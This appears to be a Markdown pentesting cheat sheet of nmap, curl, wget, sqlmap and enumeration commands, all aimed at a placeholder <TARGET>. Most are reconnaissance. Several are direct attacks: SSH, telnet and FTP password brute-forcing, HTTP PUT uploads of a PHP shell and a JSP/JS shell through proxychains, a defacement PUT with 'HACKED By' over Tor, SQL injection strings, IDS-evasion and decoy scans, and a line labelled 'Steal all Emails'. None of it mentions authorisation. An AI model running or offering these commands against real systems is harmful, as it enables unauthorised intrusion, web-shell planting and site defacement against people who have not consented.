# <img width="28" src="http://0z3r00t3r.6te.net/img/folder.png"> Nmap 
##### &#x1F538; options:
    #(OPTION): -P0 |-> skip ping
    #(OPTION): -iL list.txt |-> to scan file with ips websites
    #(OPTION): -T0 / or / -T1 |-> avoid IDS detection firewall
    #(OPTION): -oG scan.txt |-> Grepable output
    #(OPTION): -sW |-> TCP windows port scan
    #(OPTION): -sS / -sT / -sU / -sA / -sM |-> TCP SYN - TCP port - UDP - TCP ACK - TCP Maimon port
    #(OPTION): -sL |-> No scan list targets only
    #(OPTION): -sn |-> disable port scan
    #(OPTION): -Pn |-> disable host - port only
    #(OPTION): -n |-> never do dns resolution

##### &#x1F538; xml.out to use php insert :
    - sudo nmap -d -sV -Pn -F -sS -n -O -A --script=default,external,ssl-heartbleed --script-args shodan-api.apikey=api-Key-Here -oX out.xml <TARGET>

##### &#x1F538; Supported Methods: GET HEAD POST OPTIONS :
    nmap -script http-methods -p443 -script-args http-methods.url-path='/' <TARGET>

##### &#x1F538;  SSH Brute Cmd : 
    nmap -p 22 --script ssh-brute --script-args userdb=/opt/backbox/user.txt,passdb=/opt/backbox/pass.txt --script-args ssh-brute.timeout=4s <TARGET>

##### &#x1F538;  Telnet Brute Cmd : 
    nmap -p 23 --script telnet-brute --script-args userdb=/opt/backbox/user.txt,passdb=/opt/backbox/pass.txt,telnet-brute.timeout=8s <TARGET>

##### &#x1F538;  Put method : 
    nmap -script http-put -script-args http-put.url='/shell.php',http-put.file='/shell.txt' -p 80 <TARGET>

#### &#x1F538; Print options : 

    #print ip + website
      nmap -p80 -Pn -oG - <TARGET>/24 | awk '/open/{print $2 " " $3}'

    #print ip + port open
      nmap -vv <TARGET>/24  | awk -F'[ /]' '/Discovered open port/{print $NF":"$4}'

    #print websites only
      nmap -sL -oG - <TARGET>/24 | awk '$3~/\(.+\)/{print $3}' | tr -d '()'

    #print ip only using port 22
      nmap -n -sn -PS22 -oG - <TARGET>/24 | awk '/Status: Up$/{print $2}'

    #print IP addresses that are up
      nmap -n -sn -oG - <TARGET>/24 | awk '/Status: Up$/{print $2}'

#### &#x1F538; Domains : 
    nmap --script=dns-brute.nse <TARGET>
    nmap --script=auth <TARGET>
    nmap --script=default <TARGET>
    nmap -Pn --script=vuln <TARGET>
    nmap -n -p445 --script=broadcast <TARGET>
    nmap --script external <TARGET>
    nmap -p 53 --script dns-zone-transfer.nse -v <TARGET>
    nmap -Pn -sV --script=vulners <TARGET>
    nmap --script http-methods --script-args http-methods.url-path='/' <TARGET>
    nmap -p 80 --script dns-brute.nse <TARGET>
    nmap -sV --script=vulscan/vulscan.nse <TARGET>
    nmap -O --script external -oX out.xml <TARGET>
    nmap -d --script ssl-heartbleed --script-args vulns.showall -sV <TARGET> -oX s.xml
    sudo nmap -PN -F -O -A --script=default,external,ssl-heartbleed -sV -oX targetoutput.xml -d <TARGET>
    nmap -sV --script ./sourcfile.nse <TARGET>
    nmap -sV --script http-sec-headers.nse <TARGET>
    nmap -F --script icap-info <TARGET>
    nmap --script=http-enum -p80 -n 
    nmap -p 1344 --script icap-info <TARGET>
    nmap -sn -Pn --script hostmap-crtsh <TARGET>
    
    
# <img width="28" src="http://0z3r00t3r.6te.net/img/folder.png"> Curl : 

##### &#x1F538; print server name using curl
`curl -i -v --url <TARGET> 2> /dev/null | grep Server`

##### &#x1F538; SCAN 443 With Curl
`curl -insecure -v -X OPTIONS <TARGET>`
    
##### &#x1F538; Curl Injection :     
`curl -v --header "X-CustomHeader: SQLi" --cookie "Set-Cookie:SQLi" --user-agent "User-Agent: SQLi" -H "Accept: application/json-SQLi" -H "Set-Cookie: SQLi"\"  <TARGET>`
    
##### &#x1F538; PUT FILE WITH Curl :
`curl -i -X PUT -H "Content-Type: text/plain; charset=utf-8" -d "HACKED By" <TARGET>/x.php --socks5 127.0.0.1:9050`

##### &#x1F538; AnyCMD:
    #Bypass : `curl --resolve www.DOMAIN.com:80:127.0.0.1 <TARGET>`
    #http Status : `curl -sL -w "%{http_code}\n" "<TARGET/DOMAIN>" -o /dev/null`
    #curl post : curl --socks5-hostname 127.0.0.1:9050 --data "search=1' or 1+1--+-"  target.com
    #curl injec : curl -v --header "X-CustomHeader: 'order by 111--+-" target.com
    #curl bypass resolve : curl --insecure --resolve target.com:80:127.0.0.1 "https://target.com"
    #curl Steal all Emails : curl -L -K -v --silent http://target.com/ 2>&1 | grep -hrio "\b[a-z0-9.-]\+@[a-z0-9.-]\+\.[a-z]\{2,4\}\+\b"
    #curl grep Server : curl -v --silent target.com 2>&1 | grep -E "Server:" | cut -d ':' -f2-2 | head -1 | tail -1
    #curl grep Wordpress : curl -insecure -X OPTIONS target.com | grep -E "admin-ajax.php|wp-content|wp-admin|wp-json|wp-includes"
    #curl grep input value form : curl -J -L target.com | grep -E "<input+" | grep -E "name=[\"]+[a-z]+"

    #wget grep page : wget --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=windows --domains website.org --no-parent target.com/login
    #wget mirror page 1 : wget --execute robots=off --recursive --no-parent --continue target.com
    #wget mirror page 2 : wget --page-requisites --span-hosts --convert-links --adjust-extension http://target.com
    #wget mirror with save folder : wget -r -P TargetFolder --execute robots=off --recursive --no-parent --continue target.com
    #wget : wget target.com/login --no-check-certificate --auth-no-challenge 2>&1

    #SSL : sslscan --http --bugs --verbose --show-certificate target.com
    #SSL : openssl s_client -showcerts -servername IP -connect target.com:443 2>/dev/null
    #SSL cert : openssl req -newkey rsa:2048 -nodes -keyout targetkey.key -x509 -days 1000 -subj '/CN=www.target.com/O=target./C=SA' -out targetcrt.crt

    #SQLMAP : sqlmap -u "target.com" --dbs -v 3 --tor --level 5 --risk 3 --time-sec 10 --batch --tamper=space2comment,between | grep -E -e "+\[INFO+]"
    #SQLMAP : sqlmap -u "target.com" --dbs -v 3 --tor --level 5 --risk 3 --time-sec 10 --batch --tamper=space2comment,between | egrep -i "(GET.+.appears.to.be|INFO.+.the.back-end.DBMS|back-end DBMS|web application technology|available databases|\[\*\]|it looks like the)"
    =====================================
    #nmap : nmap --script=http-methods.nse --script-args http-methods.url-path=/wp-config target.com
    #nmap : nmap --script=http-methods.nse --script-args http-methods.retest=1 target.com
    #nmap : nmap -d --script ssl-heartbleed --script-trace --script-args vulns.showall -sV target.com
    #nmap : nmap -p 21 --script=ftp-brute nmap target.com -d  
    #nmap : nmap -sA -T4 target.com
    #nmap : nmap -vv TARGET_IP_HERE  | awk -F'[ /]' '/Discovered open port/{print $NF":"$4}'
    #nmap : nmap -script http-methods -p443 -script-args http-methods.url-path='/' target.com | grep -Ee "GET|POST|HEAD|OPTIONS"
    #nmap : sudo nmap -T4 -sS target.com | grep -e "80\|81\|8080" | cut -d "/" -f1
    #nmap : nmap -D RND:10 -p 443 target.com
    #Tor: proxychains nmap -sTV -n -PN -p3306 -iL test_target.txt 
    #Fake DNS with NMAP : nmap target.com -D fakeDomain.com fakeDomain2.com
    nmap -sS -O target.com
    #view dir: nmap --script=http-enum -p80 -n target.com
    ==== Dirs info & DNC & IP ====
    #wget dir links : wget -c --user-agent="HHO" --content-disposition -E -qO- target.com | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
    scanlink.py -H http://target.com/ -f linkadmin.txt
    dnsrecon.py -d target.com -D target.com.N.txt -t std --xml target.com.dns.xml
    brutesub.pl -d target.com -s target.com.txt -u 6 -n CCCC
    subbrute.py target.com -o target.com.names
    dirsearch -u target.com -e php
    sublist3r.py -d target.com -b -t 50 -p 80,443,21,22
    dotdotpwn.pl -m ftp -h www.target.com -M GET -U XX -P XX
    dotdotpwn.pl -m http -h target.com -d 6 -f -x HTTP=80
    golismero.py https://target.com
    nslookup -q=TXT target.com
    dmitry -winsepo target.com
    sudomy -d target.com -dP -eP -rS -cF -pS -tO -gW --httpx --dnsprobe -aI webanalyze -sS
    fierce --domain target.com --subdomains accounts admin ads
    --
    crunch 2 3 qwertyuioplkjhgfdsazxcvbnm1234567890 > smpList2
    onesixtyone -c smpList2 -d target.com
    --
    ---ip/host/dns---
    dig -t SOA target.com | grep -A1 "AUTHORITY SECTION\|ANSWER SECTION" | awk '{print$5}' | sed '/^$/d'
    dig +short target.com | awk '{ print ; exit }'
    host target.com | awk '/has address/ { print $4 }'
    host -4 -W1 -t A target.com 2>/dev/null | awk '/has address/ { print $NF; exit }'
    getent hosts target.com | awk '{ print $1 }'
    nslookup target.com | awk '/^Address: / { print $2 }'
    php -r "echo gethostbyname('target.com');"
    tor-resolve -5 -v www.target.com 127.0.0.1:9050
    Script_END: ---------------------

##### &#x1F538; Requested Range Not Stisfiable vulnerable : 
    curl -v <TARGET> -H "Host: <TARGET>" -H "Range: bytes=0-18446744073709551615" -k
   
   #Turn WiFi OFF : `nmcli radio wifi off` &#x274C;
   
   #Turn WiFi ON : `nmcli radio wifi on` &#x2714;
   
##### &#x1F538; generate shell as js or jsp and use terminal to upload to the target:  

`proxychains curl -X PUT <TARGET>:79/admin/js.jsp -d @- < /opt/shell.js`

 
    
